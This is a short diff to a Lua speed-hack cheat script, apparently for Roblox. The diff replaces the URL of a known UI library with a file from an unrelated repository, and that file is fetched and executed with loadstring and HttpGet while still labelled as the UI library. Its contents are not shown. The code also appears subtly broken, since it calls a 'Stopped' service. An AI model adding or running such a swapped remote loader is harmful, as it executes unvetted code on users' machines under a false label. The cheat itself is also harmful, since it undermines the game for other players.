@@ -1,6 +1,6 @@
 -- Simple Speed Hack UI
 -- Load the library for the UI
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gislle/script/refs/heads/main/script.lua"))()
 
 -- Create the window
 local Window = Library:CreateWindow("Speed Hack")
@@ -34,4 +34,5 @@ end)
 -- Revert to original speed when the script is stopped (optional)
 game:GetService("Stopped"):Connect(function()
     Humanoid.WalkSpeed = OriginalWalkSpeed
+
 end)
